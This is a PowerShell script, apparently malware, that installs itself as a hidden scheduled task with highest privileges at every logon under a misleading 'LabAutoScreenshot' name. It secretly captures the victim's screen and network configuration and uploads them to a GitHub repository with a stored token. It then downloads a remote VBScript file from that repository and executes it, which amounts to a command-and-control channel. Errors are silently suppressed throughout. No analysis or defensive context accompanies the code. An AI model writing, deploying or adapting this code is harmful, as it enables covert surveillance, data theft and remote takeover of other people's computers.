$global:token = [System.Environment]::GetEnvironmentVariable('GH_TOKEN', 'User')

$owner = 'ghost-mvt'
$repo = 'XUZ'
$scriptPath = "$env:APPDATA\windos_task.ps1"
$taskName = "LabAutoScreenshot"
$computerId = $env:COMPUTERNAME
$cmdFileName = "cmd.vbs"

if (-not $global:token) { exit }

function Download-And-Execute-Command {
    $apiUrl = "https://raw.githubusercontent.com/$owner/$repo/main/uploads/$cmdFileName"
    $savePath = "$env:TEMP\$cmdFileName"
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "token $global:token")
        $webClient.DownloadFile($apiUrl, $savePath)
        Start-Process "wscript.exe" -ArgumentList "`"$savePath`""
    } catch {}
}

function Perform-Task {
    $tempDir = $env:TEMP
    $screenshotPath = "$tempDir\lab_capture.png"
    $infoPath = "$tempDir\network_info.txt"

    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bounds.Size)
        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bitmap.Dispose()
    } catch {}

    ipconfig | Out-File $infoPath -Encoding utf8

    $filesToUpload = @{
        "uploads/$computerId/Img.png"      = $screenshotPath
        "uploads/$computerId/ipconfig.txt" = $infoPath
    }

    $headers = @{
        "Authorization" = "token $global:token"
        "Accept"        = "application/vnd.github.v3+json"
        "User-Agent"    = "PowerShell-Script"
    }

    foreach ($remotePath in $filesToUpload.Keys) {
        $localFile = $filesToUpload[$remotePath]
        if (Test-Path $localFile) {
            $bytes = [System.IO.File]::ReadAllBytes($localFile)
            $base64Content = [System.Convert]::ToBase64String($bytes)
            $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$remotePath"
            
            try {
                $existingFile = Invoke-RestMethod -Uri $apiUrl -Method Get -Headers $headers -ErrorAction SilentlyContinue
                $sha = $existingFile.sha
            } catch { $sha = $null }

            $body = @{ "message" = "Update $computerId"; "content" = $base64Content; "sha" = $sha } | ConvertTo-Json
            try { Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body -ContentType "application/json" } catch {}
            Remove-Item $localFile -ErrorAction SilentlyContinue
        }
    }
    Download-And-Execute-Command
}

if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
}

$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Settings $settings -Principal $principal -Force

Perform-Task
